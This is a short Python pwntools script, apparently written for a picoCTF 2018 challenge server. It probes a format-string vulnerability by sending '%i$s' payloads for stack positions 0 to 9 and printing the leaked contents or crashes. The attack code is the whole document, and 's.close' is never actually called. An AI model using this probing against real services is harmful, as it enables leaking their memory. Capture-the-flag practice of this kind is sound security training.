#!/usr/bin/env python

from pwn import *
host, port = '2018shell.picoctf.com', 57169

context.log_level = 'critical'

for i in range(10):
    s = remote(host, port)
    s.recvuntil('> ')

    s.sendline('%' + str(i) + '$s')
    print i, 'postion of stack : ', 
    response = s.recv()

    if 'dumped core' in response:
        print 'segmentation fault'
    else:
        print response

    s.close
